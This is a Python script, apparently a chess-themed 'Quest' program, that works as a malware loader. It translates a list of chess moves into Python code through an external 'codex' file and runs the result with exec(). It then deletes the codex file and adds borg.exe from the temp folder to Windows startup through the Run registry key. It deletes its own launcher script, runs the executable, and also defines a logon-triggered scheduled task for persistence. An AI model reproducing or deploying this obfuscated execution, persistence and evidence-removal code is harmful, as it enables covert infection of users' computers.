import os
import subprocess
import time
import traceback
import sys
import tempfile
import winreg  # For working with Windows registry

# Step 1: Read the chess-to-Python codex mapping from the file
def read_codex_mapping(codex_file):
    chess_to_python = {}
    with open(codex_file, 'r') as file:
        for line in file:
            move, code = line.split(':', 1)  # Split at the first colon
            chess_to_python[move.strip()] = code  # Store the code exactly as it appears after the colon
    return chess_to_python

# Step 2: Translate the chess moves into Python code and execute it
def translate_and_execute_chess_moves(chess_moves, codex_file):
    # Read the codex mapping from the file
    chess_to_python = read_codex_mapping(codex_file)

    # Translate the chess moves to Python code
    python_code = ""
    for move in chess_moves:
        if move in chess_to_python:
            python_code += chess_to_python[move]  # No stripping of code to preserve spacing and indentation
        else:
            python_code += "# Unmapped move: " + move + "\n"
    
    # Print the translated code for debugging
    print("Translated Python Code:\n")
    print(python_code)  # Debugging print

    # Execute the Python code directly
    print("\nExecuting Translated Python Code...\n")
    try:
        exec(python_code)
        print("Script executed successfully.")
    except Exception as e:
        print(f"Execution failed: {e}")
        print(traceback.format_exc())  # Print the full error traceback for debugging

    # Wait for 10 seconds before removing the codex file
    print("\nWaiting 10 seconds before deleting the codex file...\n")
    time.sleep(10)

    # Step 3: Clean up by deleting the codex file
    try:
        print(f"\nDeleting {codex_file}...")
        os.remove(codex_file)  # Delete the codex file
        print(f"{codex_file} has been deleted.")
    except Exception as e:
        print(f"Error during cleanup: {e}")

# Function to add the executable to Windows startup via registry
def add_to_startup(executable_path, app_name="BorgApp"):
    try:
        # Open the registry key for the current user's startup programs
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        # Set the new value with the path to the executable
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        print(f"Successfully added {executable_path} to startup.")

        # Verify if the key was successfully added
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        value, _ = winreg.QueryValueEx(key, app_name)
        print(f"Registry Key Value for {app_name}: {value}")
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add {executable_path} to startup: {e}")
        print(traceback.format_exc())

# Chess moves representing the code
chess_moves = [
    'WP e2e4', 'BP e7e5', 'WN g1f3', 'BN b8c6', 'WB f1b5', 'BP a7a6',
    'WN b1c3', 'BN g8f6', 'BB f8e7', 'WR e1e2', 'BP b7b5', 'WB b5c6',
    'BP d7c6', 'WQ d1e2', 'BP c7c5', 'WP e4e5', 'BN f6d5', 'WR f1e1',
    'BP f7f6', 'WB c6b7', 'BP f6f5', 'WP e5e6', 'BP f5f4', 'WQ e2e4',
    'BP c6c5', 'WQ e4f4', 'BP b5b4', 'WR e1e5', 'BP c5c4', 'WR e5f5+',
    'BK e8d7', 'WR f5e5', 'WP e6e7', 'BP b4b3', 'WR e5e7', 'BK d7c6',
    'WR e7f7', 'BK c6b6', 'WR f7f8+', 'BK b6a7', 'WP e6e7', 'BP b3b2',
    'WR f8f7', 'BK a7a6', 'WR f7f6', 'BP b2b1Q', 'WQ e6d5', 'BK a6a7',
    'WR f6g6', 'BK a7a8', 'WR g6g7+', 'BK a8a7', 'WQ d5d6#', 'WP f2f3',
    'WR g7h8', 'WP f3f4', 'WR h8g8', 'WR g8f8', 'WP f4f5', 'BP g7g6',
    'WQ f5f6', 'BP g6g5', 'WR f8e8', 'WP f6g7', 'BP g5g4', 'WR e8d8',
    'BP g4g3', 'WR d8c8', 'WR g7h8', 'WP f3f4', 'WR h8g8', 'WR g8f8',  
    'WP f4f5', 'BP g7g6', 'WQ f5f6', 'BP g6g5', 'WR f8e8', 'WP f6g7',
    'BP g5g4', 'WR e8d8', 'BP g4g3', 'WR d8c8'
]

# File path of the codex
codex_file = 'binar/codex_mapping.txt'

# Translate and execute the Python code, then remove the codex file
translate_and_execute_chess_moves(chess_moves, codex_file)

# Function to run 'borg.exe' and delete Quest.py
def run_borg_executable():
    user_temp_dir = tempfile.gettempdir()
    borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
    quest_script_path = 'binar/Quest.py'  # Ensure relative path to Quest.py
    
    # Audit the paths to ensure correctness
    if not all([os.path.isdir(os.path.realpath(user_temp_dir)), os.path.isdir(os.path.join(os.getcwd(), 'binar'))]):
        print(
            "Uh hey we may have a problem",
            f"{os.getcwd()=}, {os.path.realpath(os.getcwd())=}",
            f"{os.listdir()=}, {user_temp_dir=}, {borg_exe_path=} {os.path.realpath(borg_exe_path)=}",
            sep=", ", 
            flush=True
        )
    else:
        print("Path audit passed, no problems detected.")

    print(f"\nAttempting to add {borg_exe_path} to startup...")

    if os.path.exists(borg_exe_path):
        # Add the executable to startup before it runs
        add_to_startup(borg_exe_path)

        # Clean up Quest.py after adding to startup but before executing borg.exe
        try:
            if os.path.exists(quest_script_path):
                print(f"Deleting {quest_script_path} before executing {borg_exe_path}...")
                os.remove(quest_script_path)  # Delete Quest.py
                print(f"{quest_script_path} has been deleted.")
            else:
                print(f"{quest_script_path} not found, skipping deletion.")
        except Exception as e:
            print(f"Error during Quest.py cleanup: {e}")
        
        # Now execute the executable after Quest.py is removed
        try:
            print(f"\nAttempting to execute {borg_exe_path}...")
            process = subprocess.Popen([borg_exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                print(f"{borg_exe_path} executed successfully.")
                print(stdout.decode('utf-8'))
            else:
                print(f"Execution failed with return code {process.returncode}.")
                print(stderr.decode('utf-8'))
        except Exception as e:
            print(f"Failed to run the executable: {e}")
            print(traceback.format_exc())
    else:
        print(f"Executable {borg_exe_path} not found.")

# Task Scheduler function
def add_task_scheduler(executable_path, app_name="BorgApp"):
    try:
        # Construct the command to add the task
        task_name = app_name
        user = os.getlogin()  # Get the current user
        cmd = [
            'schtasks', '/Create', '/F',
            '/SC', 'ONLOGON',  # Set the task to trigger on logon
            '/TN', task_name,  # Task name
            '/TR', executable_path,  # Task action (run executable)
            '/RU', user  # Run as current user
        ]

        # Run the command to create the scheduled task
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"Successfully added {executable_path} to Task Scheduler.")
        else:
            print(f"Failed to add task. Error: {result.stderr}")
    except Exception as e:
        print(f"An error occurred: {e}")
        print(traceback.format_exc())

# Finally, run borg.exe and delete Quest.py
run_borg_executable()
